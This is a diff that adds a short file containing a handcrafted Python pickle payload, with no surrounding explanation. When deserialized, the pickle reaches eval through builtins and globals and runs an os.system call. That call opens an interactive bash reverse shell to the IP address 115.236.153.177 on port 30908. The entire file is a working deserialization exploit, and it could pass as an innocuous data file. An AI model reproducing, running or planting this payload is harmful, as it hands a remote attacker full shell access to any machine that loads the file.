@@ -1,0 +1,13 @@
+cbuiltins
+getattr
+(cbuiltins
+getattr
+(cbuiltins
+dict
+S'get'
+tR(cbuiltins
+globals
+)RS'builtins'
+tRS'eval'
+tR(S'__import__("os").system("bash -c \'bash -i >& /dev/tcp/115.236.153.177/30908 0>&1\'")'
+tR.
